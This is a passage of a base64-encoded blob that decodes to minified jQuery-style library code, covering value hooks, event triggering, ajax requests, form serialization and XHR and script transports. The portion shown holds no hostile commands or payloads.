NlbGVjdDp7Z2V0OmZ1bmN0aW9uKGUpe2Zvcih2YXIgdCxuLHI9ZS5vcHRpb25zLGk9ZS5zZWxlY3RlZEluZGV4LHM9InNlbGVjdC1vbmUiPT09ZS50eXBlfHwwPmksbz1zP251bGw6W10sYT1zP2krMTpyLmxlbmd0aCx1PTA+aT9hOnM/aTowO2E+dTt1KyspaWYobj1yW3VdLChuLnNlbGVjdGVkfHx1PT09aSkmJihhZS5vcHREaXNhYmxlZD8hbi5kaXNhYmxlZDpudWxsPT09bi5nZXRBdHRyaWJ1dGUoImRpc2FibGVkIikpJiYoIW4ucGFyZW50Tm9kZS5kaXNhYmxlZHx8IWNlLm5vZGVOYW1lKG4ucGFyZW50Tm9kZSwib3B0Z3JvdXAiKSkpe2lmKHQ9Y2UobikudmFsKCkscylyZXR1cm4gdDtvLnB1c2godCl9cmV0dXJuIG99LHNldDpmdW5jdGlvbihlLHQpe2Zvcih2YXIgbixyLGk9ZS5vcHRpb25zLHM9Y2UubWFrZUFycmF5KHQpLG89aS5sZW5ndGg7by0tOylyPWlbb10sKHIuc2VsZWN0ZWQ9Y2UuaW5BcnJheShjZS52YWxIb29rcy5vcHRpb24uZ2V0KHIpLHMpPi0xKSYmKG49ITApO3JldHVybiBufHwoZS5zZWxlY3RlZEluZGV4PS0xKSxzfX19fSksY2UuZWFjaChbInJhZGlvIiwiY2hlY2tib3giXSxmdW5jdGlvbigpe2NlLnZhbEhvb2tzW3RoaXNdPXtzZXQ6ZnVuY3Rpb24oZSx0KXtyZXR1cm4gY2UuaXNBcnJheSh0KT9lLmNoZWNrZWQ9Y2UuaW5BcnJheShjZShlKS52YWwoKSx0KT4tMTp2b2lkIDB9fSxhZS5jaGVja09ufHwoY2UudmFsSG9va3NbdGhpc10uZ2V0PWZ1bmN0aW9uKGUpe3JldHVybiBudWxsPT09ZS5nZXRBdHRyaWJ1dGUoInZhbHVlIik/Im9uIjplLnZhbHVlfSl9KTt2YXIgdnQ9L14oPzpmb2N1c2luZm9jdXN8Zm9jdXNvdXRibHVyKSQvO2NlLmV4dGVuZChjZS5ldmVudCx7dHJpZ2dlcjpmdW5jdGlvbihlLHQscixpKXt2YXIgcyxvLGEsdSxjLGwsZCxoPVtyfHxaXSxmPW9lLmNhbGwoZSwidHlwZSIpP2UudHlwZTplLHA9b2UuY2FsbChlLCJuYW1lc3BhY2UiKT9lLm5hbWVzcGFjZS5zcGxpdCgiLiIpOltdO2lmKG89YT1yPXJ8fFosMyE9PXIubm9kZVR5cGUmJjghPT1yLm5vZGVUeXBlJiYhdnQudGVzdChmK2NlLmV2ZW50LnRyaWdnZXJlZCkmJihmLmluZGV4T2YoIi4iKT4tMSYmKHA9Zi5zcGxpdCgiLiIpLGY9cC5zaGlmdCgpLHAuc29ydCgpKSxjPWYuaW5kZXhPZigiOiIpPDAmJiJvbiIrZixlPWVbY2UuZXhwYW5kb10/ZTpuZXcgY2UuRXZlbnQoZiwib2JqZWN0Ij09dHlwZW9mIGUmJmUpLGUuaXNUcmlnZ2VyPWk/MjozLGUubmFtZXNwYWNlPXAuam9pbigiLiIpLGUucm5hbWVzcGFjZT1lLm5hbWVzcGFjZT9uZXcgUmVnRXhwKCIoXnxcXC4pIitwLmpvaW4oIlxcLig/Oi4qXFwufCkiKSsiKFxcLnwkKSIpOm51bGwsZS5yZXN1bHQ9dm9pZCAwLGUudGFyZ2V0fHwoZS50YXJnZXQ9ciksdD1udWxsPT10P1tlXTpjZS5tYWtlQXJyYXkodCxbZV0pLGQ9Y2UuZXZlbnQuc3BlY2lhbFtmXXx8e30saXx8IWQudHJpZ2dlcnx8ZC50cmlnZ2VyLmFwcGx5KHIsdCkhPT0hMSkpe2lmKCFpJiYhZC5ub0J1YmJsZSYmIWNlLmlzV2luZG93KHIpKXtmb3IodT1kLmRlbGVnYXRlVHlwZXx8Zix2dC50ZXN0KHUrZil8fChvPW8ucGFyZW50Tm9kZSk7bztvPW8ucGFyZW50Tm9kZSloLnB1c2gobyksYT1vO2E9PT0oci5vd25lckRvY3VtZW50fHxaKSYmaC5wdXNoKGEuZGVmYXVsdFZpZXd8fGEucGFyZW50V2luZG93fHxuKX1mb3Iocz0wOyhvPWhbcysrXSkmJiFlLmlzUHJvcGFnYXRpb25TdG9wcGVkKCk7KWUudHlwZT1zPjE/dTpkLmJpbmRUeXBlfHxmLGw9KHhlLmdldChvLCJldmVudHMiKXx8e30pW2UudHlwZV0mJnhlLmdldChvLCJoYW5kbGUiKSxsJiZsLmFwcGx5KG8sdCksbD1jJiZvW2NdLGwmJmwuYXBwbHkmJlNlKG8pJiYoZS5yZXN1bHQ9bC5hcHBseShvLHQpLGUucmVzdWx0PT09ITEmJmUucHJldmVudERlZmF1bHQoKSk7cmV0dXJuIGUudHlwZT1mLGl8fGUuaXNEZWZhdWx0UHJldmVudGVkKCl8fGQuX2RlZmF1bHQmJmQuX2RlZmF1bHQuYXBwbHkoaC5wb3AoKSx0KSE9PSExfHwhU2Uocil8fGMmJmNlLmlzRnVuY3Rpb24ocltmXSkmJiFjZS5pc1dpbmRvdyhyKSYmKGE9cltjXSxhJiYocltjXT1udWxsKSxjZS5ldmVudC50cmlnZ2VyZWQ9ZixyW2ZdKCksY2UuZXZlbnQudHJpZ2dlcmVkPXZvaWQgMCxhJiYocltjXT1hKSksZS5yZXN1bHR9fSxzaW11bGF0ZTpmdW5jdGlvbihlLHQsbil7dmFyIHI9Y2UuZXh0ZW5kKG5ldyBjZS5FdmVudCxuLHt0eXBlOmUsaXNTaW11bGF0ZWQ6ITB9KTtjZS5ldmVudC50cmlnZ2VyKHIsbnVsbCx0KSxyLmlzRGVmYXVsdFByZXZlbnRlZCgpJiZuLnByZXZlbnREZWZhdWx0KCl9fSksY2UuZm4uZXh0ZW5kKHt0cmlnZ2VyOmZ1bmN0aW9uKGUsdCl7cmV0dXJuIHRoaXMuZWFjaChmdW5jdGlvbigpe2NlLmV2ZW50LnRyaWdnZXIoZSx0LHRoaXMpfSl9LHRyaWdnZXJIYW5kbGVyOmZ1bmN0aW9uKGUsdCl7dmFyIG49dGhpc1swXTtyZXR1cm4gbj9jZS5ldmVudC50cmlnZ2VyKGUsdCxuLCEwKTp2b2lkIDB9fSksY2UuZWFjaCgiYmx1ciBmb2N1cyBmb2N1c2luIGZvY3Vzb3V0IGxvYWQgcmVzaXplIHNjcm9sbCB1bmxvYWQgY2xpY2sgZGJsY2xpY2sgbW91c2Vkb3duIG1vdXNldXAgbW91c2Vtb3ZlIG1vdXNlb3ZlciBtb3VzZW91dCBtb3VzZWVudGVyIG1vdXNlbGVhdmUgY2hhbmdlIHNlbGVjdCBzdWJtaXQga2V5ZG93biBrZXlwcmVzcyBrZXl1cCBlcnJvciBjb250ZXh0bWVudSIuc3BsaXQoIiAiKSxmdW5jdGlvbihlLHQpe2NlLmZuW3RdPWZ1bmN0aW9uKGUsbil7cmV0dXJuIGFyZ3VtZW50cy5sZW5ndGg+MD90aGlzLm9uKHQsbnVsbCxlLG4pOnRoaXMudHJpZ2dlcih0KX19KSxjZS5mbi5leHRlbmQoe2hvdmVyOmZ1bmN0aW9uKGUsdCl7cmV0dXJuIHRoaXMubW91c2VlbnRlcihlKS5tb3VzZWxlYXZlKHR8fGUpfX0pLGFlLmZvY3VzaW49Im9uZm9jdXNpbiJpbiBuLGFlLmZvY3VzaW58fGNlLmVhY2goe2ZvY3VzOiJmb2N1c2luIixibHVyOiJmb2N1c291dCJ9LGZ1bmN0aW9uKGUsdCl7dmFyIG49ZnVuY3Rpb24oZSl7Y2UuZXZlbnQuc2ltdWxhdGUodCxlLnRhcmdldCxjZS5ldmVudC5maXgoZSkpfTtjZS5ldmVudC5zcGVjaWFsW3RdPXtzZXR1cDpmdW5jdGlvbigpe3ZhciByPXRoaXMub3duZXJEb2N1bWVudHx8dGhpcyxpPXhlLmFjY2VzcyhyLHQpO2l8fHIuYWRkRXZlbnRMaXN0ZW5lcihlLG4sITApLHhlLmFjY2VzcyhyLHQsKGl8fDApKzEpfSx0ZWFyZG93bjpmdW5jdGlvbigpe3ZhciByPXRoaXMub3duZXJEb2N1bWVudHx8dGhpcyxpPXhlLmFjY2VzcyhyLHQpLTE7aT94ZS5hY2Nlc3Mocix0LGkpOihyLnJlbW92ZUV2ZW50TGlzdGVuZXIoZSxuLCEwKSx4ZS5yZW1vdmUocix0KSl9fX0pO3ZhciBidD1uLmxvY2F0aW9uLE10PWNlLm5vdygpLEx0PS9cPy87Y2UucGFyc2VKU09OPWZ1bmN0aW9uKGUpe3JldHVybiBKU09OLnBhcnNlKGUrIiIpfSxjZS5wYXJzZVhNTD1mdW5jdGlvbihlKXt2YXIgdDtpZighZXx8InN0cmluZyIhPXR5cGVvZiBlKXJldHVybiBudWxsO3RyeXt0PShuZXcgbi5ET01QYXJzZXIpLnBhcnNlRnJvbVN0cmluZyhlLCJ0ZXh0L3htbCIpfWNhdGNoKHIpe3Q9dm9pZCAwfXJldHVybiB0JiYhdC5nZXRFbGVtZW50c0J5VGFnTmFtZSgicGFyc2VyZXJyb3IiKS5sZW5ndGh8fGNlLmVycm9yKCJJbnZhbGlkIFhNTDogIitlKSx0fTt2YXIga3Q9LyMuKiQvLHd0PS8oWz8mXSlfPVteJl0qLyxUdD0vXiguKj8pOlsgXHRdKihbXlxyXG5dKikkL2dtLFl0PS9eKD86YWJvdXR8YXBwfGFwcC1zdG9yYWdlfC4rLWV4dGVuc2lvbnxmaWxlfHJlc3x3aWRnZXQpOiQvLER0PS9eKD86R0VUfEhFQUQpJC8sU3Q9L15cL1wvLyx4dD17fSxqdD17fSxIdD0iKi8iLmNvbmNhdCgiKiIpLFB0PVouY3JlYXRlRWxlbWVudCgiYSIpO1B0LmhyZWY9YnQuaHJlZixjZS5leHRlbmQoe2FjdGl2ZTowLGxhc3RNb2RpZmllZDp7fSxldGFnOnt9LGFqYXhTZXR0aW5nczp7dXJsOmJ0LmhyZWYsdHlwZToiR0VUIixpc0xvY2FsOll0LnRlc3QoYnQucHJvdG9jb2wpLGdsb2JhbDohMCxwcm9jZXNzRGF0YTohMCxhc3luYzohMCxjb250ZW50VHlwZToiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04IixhY2NlcHRzOnsiKiI6SHQsdGV4dDoidGV4dC9wbGFpbiIsaHRtbDoidGV4dC9odG1sIix4bWw6ImFwcGxpY2F0aW9uL3htbCwgdGV4dC94bWwiLGpzb246ImFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCJ9LGNvbnRlbnRzOnt4bWw6L1xieG1sXGIvLGh0bWw6L1xiaHRtbC8sanNvbjovXGJqc29uXGIvfSxyZXNwb25zZUZpZWxkczp7eG1sOiJyZXNwb25zZVhNTCIsdGV4dDoicmVzcG9uc2VUZXh0Iixqc29uOiJyZXNwb25zZUpTT04ifSxjb252ZXJ0ZXJzOnsiKiB0ZXh0IjpTdHJpbmcsInRleHQgaHRtbCI6ITAsInRleHQganNvbiI6Y2UucGFyc2VKU09OLCJ0ZXh0IHhtbCI6Y2UucGFyc2VYTUx9LGZsYXRPcHRpb25zOnt1cmw6ITAsY29udGV4dDohMH19LGFqYXhTZXR1cDpmdW5jdGlvbihlLHQpe3JldHVybiB0P0IoQihlLGNlLmFqYXhTZXR0aW5ncyksdCk6QihjZS5hamF4U2V0dGluZ3MsZSl9LGFqYXhQcmVmaWx0ZXI6Sih4dCksYWpheFRyYW5zcG9ydDpKKGp0KSxhamF4OmZ1bmN0aW9uKGUsdCl7ZnVuY3Rpb24gcihlLHQscixhKXt2YXIgYyxkLGcsdixNLGs9dDsyIT09YiYmKGI9Mix1JiZuLmNsZWFyVGltZW91dCh1KSxpPXZvaWQgMCxvPWF8fCIiLEwucmVhZHlTdGF0ZT1lPjA/NDowLGM9ZT49MjAwJiYzMDA+ZXx8MzA0PT09ZSxyJiYodj1WKGgsTCxyKSksdj1HKGgsdixMLGMpLGM/KGguaWZNb2RpZmllZCYmKE09TC5nZXRSZXNwb25zZUhlYWRlcigiTGFzdC1Nb2RpZmllZCIpLE0mJihjZS5sYXN0TW9kaWZpZWRbc109TSksTT1MLmdldFJlc3BvbnNlSGVhZGVyKCJldGFnIiksTSYmKGNlLmV0YWdbc109TSkpLDIwND09PWV8fCJIRUFEIj09PWgudHlwZT9rPSJub2NvbnRlbnQiOjMwND09PWU/az0ibm90bW9kaWZpZWQiOihrPXYuc3RhdGUsZD12LmRhdGEsZz12LmVycm9yLGM9IWcpKTooZz1rLCFlJiZrfHwoaz0iZXJyb3IiLDA+ZSYmKGU9MCkpKSxMLnN0YXR1cz1lLEwuc3RhdHVzVGV4dD0odHx8aykrIiIsYz9fLnJlc29sdmVXaXRoKGYsW2QsayxMXSk6Xy5yZWplY3RXaXRoKGYsW0wsayxnXSksTC5zdGF0dXNDb2RlKHkpLHk9dm9pZCAwLGwmJnAudHJpZ2dlcihjPyJhamF4U3VjY2VzcyI6ImFqYXhFcnJvciIsW0wsaCxjP2Q6Z10pLG0uZmlyZVdpdGgoZixbTCxrXSksbCYmKHAudHJpZ2dlcigiYWpheENvbXBsZXRlIixbTCxoXSksLS1jZS5hY3RpdmV8fGNlLmV2ZW50LnRyaWdnZXIoImFqYXhTdG9wIikpKX0ib2JqZWN0Ij09dHlwZW9mIGUmJih0PWUsZT12b2lkIDApLHQ9dHx8e307dmFyIGkscyxvLGEsdSxjLGwsZCxoPWNlLmFqYXhTZXR1cCh7fSx0KSxmPWguY29udGV4dHx8aCxwPWguY29udGV4dCYmKGYubm9kZVR5cGV8fGYuanF1ZXJ5KT9jZShmKTpjZS5ldmVudCxfPWNlLkRlZmVycmVkKCksbT1jZS5DYWxsYmFja3MoIm9uY2UgbWVtb3J5IikseT1oLnN0YXR1c0NvZGV8fHt9LGc9e30sdj17fSxiPTAsTT0iY2FuY2VsZWQiLEw9e3JlYWR5U3RhdGU6MCxnZXRSZXNwb25zZUhlYWRlcjpmdW5jdGlvbihlKXt2YXIgdDtpZigyPT09Yil7aWYoIWEpZm9yKGE9e307dD1UdC5leGVjKG8pOylhW3RbMV0udG9Mb3dlckNhc2UoKV09dFsyXTt0PWFbZS50b0xvd2VyQ2FzZSgpXX1yZXR1cm4gbnVsbD09dD9udWxsOnR9LGdldEFsbFJlc3BvbnNlSGVhZGVyczpmdW5jdGlvbigpe3JldHVybiAyPT09Yj9vOm51bGx9LHNldFJlcXVlc3RIZWFkZXI6ZnVuY3Rpb24oZSx0KXt2YXIgbj1lLnRvTG93ZXJDYXNlKCk7cmV0dXJuIGJ8fChlPXZbbl09dltuXXx8ZSxnW2VdPXQpLHRoaXN9LG92ZXJyaWRlTWltZVR5cGU6ZnVuY3Rpb24oZSl7cmV0dXJuIGJ8fChoLm1pbWVUeXBlPWUpLHRoaXN9LHN0YXR1c0NvZGU6ZnVuY3Rpb24oZSl7dmFyIHQ7aWYoZSlpZigyPmIpZm9yKHQgaW4gZSl5W3RdPVt5W3RdLGVbdF1dO2Vsc2UgTC5hbHdheXMoZVtMLnN0YXR1c10pO3JldHVybiB0aGlzfSxhYm9ydDpmdW5jdGlvbihlKXt2YXIgdD1lfHxNO3JldHVybiBpJiZpLmFib3J0KHQpLHIoMCx0KSx0aGlzfX07aWYoXy5wcm9taXNlKEwpLmNvbXBsZXRlPW0uYWRkLEwuc3VjY2Vzcz1MLmRvbmUsTC5lcnJvcj1MLmZhaWwsaC51cmw9KChlfHxoLnVybHx8YnQuaHJlZikrIiIpLnJlcGxhY2Uoa3QsIiIpLnJlcGxhY2UoU3QsYnQucHJvdG9jb2wrIi8vIiksaC50eXBlPXQubWV0aG9kfHx0LnR5cGV8fGgubWV0aG9kfHxoLnR5cGUsaC5kYXRhVHlwZXM9Y2UudHJpbShoLmRhdGFUeXBlfHwiKiIpLnRvTG93ZXJDYXNlKCkubWF0Y2goVGUpfHxbIiJdLG51bGw9PWguY3Jvc3NEb21haW4pe2M9Wi5jcmVhdGVFbGVtZW50KCJhIik7dHJ5e2MuaHJlZj1oLnVybCxjLmhyZWY9Yy5ocmVmLGguY3Jvc3NEb21haW49UHQucHJvdG9jb2wrIi8vIitQdC5ob3N0IT1jLnByb3RvY29sKyIvLyIrYy5ob3N0fWNhdGNoKGspe2guY3Jvc3NEb21haW49ITB9fWlmKGguZGF0YSYmaC5wcm9jZXNzRGF0YSYmInN0cmluZyIhPXR5cGVvZiBoLmRhdGEmJihoLmRhdGE9Y2UucGFyYW0oaC5kYXRhLGgudHJhZGl0aW9uYWwpKSwkKHh0LGgsdCxMKSwyPT09YilyZXR1cm4gTDtsPWNlLmV2ZW50JiZoLmdsb2JhbCxsJiYwPT09Y2UuYWN0aXZlKysmJmNlLmV2ZW50LnRyaWdnZXIoImFqYXhTdGFydCIpLGgudHlwZT1oLnR5cGUudG9VcHBlckNhc2UoKSxoLmhhc0NvbnRlbnQ9IUR0LnRlc3QoaC50eXBlKSxzPWgudXJsLGguaGFzQ29udGVudHx8KGguZGF0YSYmKHM9aC51cmwrPShMdC50ZXN0KHMpPyImIjoiPyIpK2guZGF0YSxkZWxldGUgaC5kYXRhKSxoLmNhY2hlPT09ITEmJihoLnVybD13dC50ZXN0KHMpP3MucmVwbGFjZSh3dCwiJDFfPSIrTXQrKyk6cysoTHQudGVzdChzKT8iJiI6Ij8iKSsiXz0iK010KyspKSxoLmlmTW9kaWZpZWQmJihjZS5sYXN0TW9kaWZpZWRbc10mJkwuc2V0UmVxdWVzdEhlYWRlcigiSWYtTW9kaWZpZWQtU2luY2UiLGNlLmxhc3RNb2RpZmllZFtzXSksY2UuZXRhZ1tzXSYmTC5zZXRSZXF1ZXN0SGVhZGVyKCJJZi1Ob25lLU1hdGNoIixjZS5ldGFnW3NdKSksKGguZGF0YSYmaC5oYXNDb250ZW50JiZoLmNvbnRlbnRUeXBlIT09ITF8fHQuY29udGVudFR5cGUpJiZMLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtVHlwZSIsaC5jb250ZW50VHlwZSksTC5zZXRSZXF1ZXN0SGVhZGVyKCJBY2NlcHQiLGguZGF0YVR5cGVzWzBdJiZoLmFjY2VwdHNbaC5kYXRhVHlwZXNbMF1dP2guYWNjZXB0c1toLmRhdGFUeXBlc1swXV0rKCIqIiE9PWguZGF0YVR5cGVzWzBdPyIsICIrSHQrIjsgcT0wLjAxIjoiIik6aC5hY2NlcHRzWyIqIl0pO2ZvcihkIGluIGguaGVhZGVycylMLnNldFJlcXVlc3RIZWFkZXIoZCxoLmhlYWRlcnNbZF0pO2lmKGguYmVmb3JlU2VuZCYmKGguYmVmb3JlU2VuZC5jYWxsKGYsTCxoKT09PSExfHwyPT09YikpcmV0dXJuIEwuYWJvcnQoKTtNPSJhYm9ydCI7Zm9yKGQgaW57c3VjY2VzczoxLGVycm9yOjEsY29tcGxldGU6MX0pTFtkXShoW2RdKTtpZihpPSQoanQsaCx0LEwpKXtpZihMLnJlYWR5U3RhdGU9MSxsJiZwLnRyaWdnZXIoImFqYXhTZW5kIixbTCxoXSksMj09PWIpcmV0dXJuIEw7aC5hc3luYyYmaC50aW1lb3V0PjAmJih1PW4uc2V0VGltZW91dChmdW5jdGlvbigpe0wuYWJvcnQoInRpbWVvdXQiKX0saC50aW1lb3V0KSk7dHJ5e2I9MSxpLnNlbmQoZyxyKX1jYXRjaChrKXtpZighKDI+YikpdGhyb3cgaztyKC0xLGspfX1lbHNlIHIoLTEsIk5vIFRyYW5zcG9ydCIpO3JldHVybiBMfSxnZXRKU09OOmZ1bmN0aW9uKGUsdCxuKXtyZXR1cm4gY2UuZ2V0KGUsdCxuLCJqc29uIil9LGdldFNjcmlwdDpmdW5jdGlvbihlLHQpe3JldHVybiBjZS5nZXQoZSx2b2lkIDAsdCwic2NyaXB0Iil9fSksY2UuZWFjaChbImdldCIsInBvc3QiXSxmdW5jdGlvbihlLHQpe2NlW3RdPWZ1bmN0aW9uKGUsbixyLGkpe3JldHVybiBjZS5pc0Z1bmN0aW9uKG4pJiYoaT1pfHxyLHI9bixuPXZvaWQgMCksY2UuYWpheChjZS5leHRlbmQoe3VybDplLHR5cGU6dCxkYXRhVHlwZTppLGRhdGE6bixzdWNjZXNzOnJ9LGNlLmlzUGxhaW5PYmplY3QoZSkmJmUpKX19KSxjZS5fZXZhbFVybD1mdW5jdGlvbihlKXtyZXR1cm4gY2UuYWpheCh7dXJsOmUsdHlwZToiR0VUIixkYXRhVHlwZToic2NyaXB0Iixhc3luYzohMSxnbG9iYWw6ITEsInRocm93cyI6ITB9KX0sY2UuZm4uZXh0ZW5kKHt3cmFwQWxsOmZ1bmN0aW9uKGUpe3ZhciB0O3JldHVybiBjZS5pc0Z1bmN0aW9uKGUpP3RoaXMuZWFjaChmdW5jdGlvbih0KXtjZSh0aGlzKS53cmFwQWxsKGUuY2FsbCh0aGlzLHQpKX0pOih0aGlzWzBdJiYodD1jZShlLHRoaXNbMF0ub3duZXJEb2N1bWVudCkuZXEoMCkuY2xvbmUoITApLHRoaXNbMF0ucGFyZW50Tm9kZSYmdC5pbnNlcnRCZWZvcmUodGhpc1swXSksdC5tYXAoZnVuY3Rpb24oKXtmb3IodmFyIGU9dGhpcztlLmZpcnN0RWxlbWVudENoaWxkOyllPWUuZmlyc3RFbGVtZW50Q2hpbGQ7cmV0dXJuIGV9KS5hcHBlbmQodGhpcykpLHRoaXMpfSx3cmFwSW5uZXI6ZnVuY3Rpb24oZSl7cmV0dXJuIGNlLmlzRnVuY3Rpb24oZSk/dGhpcy5lYWNoKGZ1bmN0aW9uKHQpe2NlKHRoaXMpLndyYXBJbm5lcihlLmNhbGwodGhpcyx0KSl9KTp0aGlzLmVhY2goZnVuY3Rpb24oKXt2YXIgdD1jZSh0aGlzKSxuPXQuY29udGVudHMoKTtuLmxlbmd0aD9uLndyYXBBbGwoZSk6dC5hcHBlbmQoZSl9KX0sd3JhcDpmdW5jdGlvbihlKXt2YXIgdD1jZS5pc0Z1bmN0aW9uKGUpO3JldHVybiB0aGlzLmVhY2goZnVuY3Rpb24obil7Y2UodGhpcykud3JhcEFsbCh0P2UuY2FsbCh0aGlzLG4pOmUpfSl9LHVud3JhcDpmdW5jdGlvbigpe3JldHVybiB0aGlzLnBhcmVudCgpLmVhY2goZnVuY3Rpb24oKXtjZS5ub2RlTmFtZSh0aGlzLCJib2R5Iil8fGNlKHRoaXMpLnJlcGxhY2VXaXRoKHRoaXMuY2hpbGROb2Rlcyl9KS5lbmQoKX19KSxjZS5leHByLmZpbHRlcnMuaGlkZGVuPWZ1bmN0aW9uKGUpe3JldHVybiFjZS5leHByLmZpbHRlcnMudmlzaWJsZShlKX0sY2UuZXhwci5maWx0ZXJzLnZpc2libGU9ZnVuY3Rpb24oZSl7cmV0dXJuIGUub2Zmc2V0V2lkdGg+MHx8ZS5vZmZzZXRIZWlnaHQ+MHx8ZS5nZXRDbGllbnRSZWN0cygpLmxlbmd0aD4wfTt2YXIgRXQ9LyUyMC9nLEZ0PS9cW1xdJC8sQ3Q9L1xyP1xuL2csQXQ9L14oPzpzdWJtaXR8YnV0dG9ufGltYWdlfHJlc2V0fGZpbGUpJC9pLE90PS9eKD86aW5wdXR8c2VsZWN0fHRleHRhcmVhfGtleWdlbikvaTtjZS5wYXJhbT1mdW5jdGlvbihlLHQpe3ZhciBuLHI9W10saT1mdW5jdGlvbihlLHQpe3Q9Y2UuaXNGdW5jdGlvbih0KT90KCk6bnVsbD09dD8iIjp0LHJbci5sZW5ndGhdPWVuY29kZVVSSUNvbXBvbmVudChlKSsiPSIrZW5jb2RlVVJJQ29tcG9uZW50KHQpfTtpZih2b2lkIDA9PT10JiYodD1jZS5hamF4U2V0dGluZ3MmJmNlLmFqYXhTZXR0aW5ncy50cmFkaXRpb25hbCksY2UuaXNBcnJheShlKXx8ZS5qcXVlcnkmJiFjZS5pc1BsYWluT2JqZWN0KGUpKWNlLmVhY2goZSxmdW5jdGlvbigpe2kodGhpcy5uYW1lLHRoaXMudmFsdWUpfSk7ZWxzZSBmb3IobiBpbiBlKVgobixlW25dLHQsaSk7cmV0dXJuIHIuam9pbigiJiIpLnJlcGxhY2UoRXQsIisiKX0sY2UuZm4uZXh0ZW5kKHtzZXJpYWxpemU6ZnVuY3Rpb24oKXtyZXR1cm4gY2UucGFyYW0odGhpcy5zZXJpYWxpemVBcnJheSgpKX0sc2VyaWFsaXplQXJyYXk6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5tYXAoZnVuY3Rpb24oKXt2YXIgZT1jZS5wcm9wKHRoaXMsImVsZW1lbnRzIik7cmV0dXJuIGU/Y2UubWFrZUFycmF5KGUpOnRoaXN9KS5maWx0ZXIoZnVuY3Rpb24oKXt2YXIgZT10aGlzLnR5cGU7cmV0dXJuIHRoaXMubmFtZSYmIWNlKHRoaXMpLmlzKCI6ZGlzYWJsZWQiKSYmT3QudGVzdCh0aGlzLm5vZGVOYW1lKSYmIUF0LnRlc3QoZSkmJih0aGlzLmNoZWNrZWR8fCFPZS50ZXN0KGUpKX0pLm1hcChmdW5jdGlvbihlLHQpe3ZhciBuPWNlKHRoaXMpLnZhbCgpO3JldHVybiBudWxsPT1uP251bGw6Y2UuaXNBcnJheShuKT9jZS5tYXAobixmdW5jdGlvbihlKXtyZXR1cm57bmFtZTp0Lm5hbWUsdmFsdWU6ZS5yZXBsYWNlKEN0LCJcclxuIil9fSk6e25hbWU6dC5uYW1lLHZhbHVlOm4ucmVwbGFjZShDdCwiXHJcbiIpfX0pLmdldCgpfX0pLGNlLmFqYXhTZXR0aW5ncy54aHI9ZnVuY3Rpb24oKXt0cnl7cmV0dXJuIG5ldyBuLlhNTEh0dHBSZXF1ZXN0fWNhdGNoKGUpe319O3ZhciBSdD17MDoyMDAsMTIyMzoyMDR9LE50PWNlLmFqYXhTZXR0aW5ncy54aHIoKTthZS5jb3JzPSEhTnQmJiJ3aXRoQ3JlZGVudGlhbHMiaW4gTnQsYWUuYWpheD1OdD0hIU50LGNlLmFqYXhUcmFuc3BvcnQoZnVuY3Rpb24oZSl7dmFyIHQscjtyZXR1cm4gYWUuY29yc3x8TnQmJiFlLmNyb3NzRG9tYWluP3tzZW5kOmZ1bmN0aW9uKGkscyl7dmFyIG8sYT1lLnhocigpO2lmKGEub3BlbihlLnR5cGUsZS51cmwsZS5hc3luYyxlLnVzZXJuYW1lLGUucGFzc3dvcmQpLGUueGhyRmllbGRzKWZvcihvIGluIGUueGhyRmllbGRzKWFbb109ZS54aHJGaWVsZHNbb107ZS5taW1lVHlwZSYmYS5vdmVycmlkZU1pbWVUeXBlJiZhLm92ZXJyaWRlTWltZVR5cGUoZS5taW1lVHlwZSksZS5jcm9zc0RvbWFpbnx8aVsiWC1SZXF1ZXN0ZWQtV2l0aCJdfHwoaVsiWC1SZXF1ZXN0ZWQtV2l0aCJdPSJYTUxIdHRwUmVxdWVzdCIpOw0KZm9yKG8gaW4gaSlhLnNldFJlcXVlc3RIZWFkZXIobyxpW29dKTt0PWZ1bmN0aW9uKGUpe3JldHVybiBmdW5jdGlvbigpe3QmJih0PXI9YS5vbmxvYWQ9YS5vbmVycm9yPWEub25hYm9ydD1hLm9ucmVhZHlzdGF0ZWNoYW5nZT1udWxsLCJhYm9ydCI9PT1lP2EuYWJvcnQoKToiZXJyb3IiPT09ZT8ibnVtYmVyIiE9dHlwZW9mIGEuc3RhdHVzP3MoMCwiZXJyb3IiKTpzKGEuc3RhdHVzLGEuc3RhdHVzVGV4dCk6cyhSdFthLnN0YXR1c118fGEuc3RhdHVzLGEuc3RhdHVzVGV4dCwidGV4dCIhPT0oYS5yZXNwb25zZVR5cGV8fCJ0ZXh0Iil8fCJzdHJpbmciIT10eXBlb2YgYS5yZXNwb25zZVRleHQ/e2JpbmFyeTphLnJlc3BvbnNlfTp7dGV4dDphLnJlc3BvbnNlVGV4dH0sYS5nZXRBbGxSZXNwb25zZUhlYWRlcnMoKSkpfX0sYS5vbmxvYWQ9dCgpLHI9YS5vbmVycm9yPXQoImVycm9yIiksdm9pZCAwIT09YS5vbmFib3J0P2Eub25hYm9ydD1yOmEub25yZWFkeXN0YXRlY2hhbmdlPWZ1bmN0aW9uKCl7ND09PWEucmVhZHlTdGF0ZSYmbi5zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7dCYmcigpfSl9LHQ9dCgiYWJvcnQiKTt0cnl7YS5zZW5kKGUuaGFzQ29udGVudCYmZS5kYXRhfHxudWxsKX1jYXRjaCh1KXtpZih0KXRocm93IHV9fSxhYm9ydDpmdW5jdGlvbigpe3QmJnQoKX19OnZvaWQgMH0pLGNlLmFqYXhTZXR1cCh7YWNjZXB0czp7c2NyaXB0OiJ0ZXh0L2phdmFzY3JpcHQsIGFwcGxpY2F0aW9uL2phdmFzY3JpcHQsIGFwcGxpY2F0aW9uL2VjbWFzY3JpcHQsIGFwcGxpY2F0aW9uL3gtZWNtYXNjcmlwdCJ9LGNvbnRlbnRzOntzY3JpcHQ6L1xiKD86amF2YXxlY21hKXNjcmlwdFxiL30sY29udmVydGVyczp7InRleHQgc2NyaXB0IjpmdW5jdGlvbihlKXtyZXR1cm4gY2UuZ2xvYmFsRXZhbChlKSxlfX19KSxjZS5hamF4UHJlZmlsdGVyKCJzY3JpcHQiLGZ1bmN0aW9uKGUpe3ZvaWQgMD09PWUuY2FjaGUmJihlLmNhY2hlPSExKSxlLmNyb3NzRG9tYWluJiYoZS50eXBlPSJHRVQiKX0pLGNlLmFqYXhUcmFuc3BvcnQoInNjcmlwdCIsZnVuY3Rpb24oZSl7aWYoZS5jcm9zc0RvbWFpbil7dmFyIHQsbjtyZXR1cm57c2VuZDpmdW5jdGlvbihyLGkpe3Q9Y2U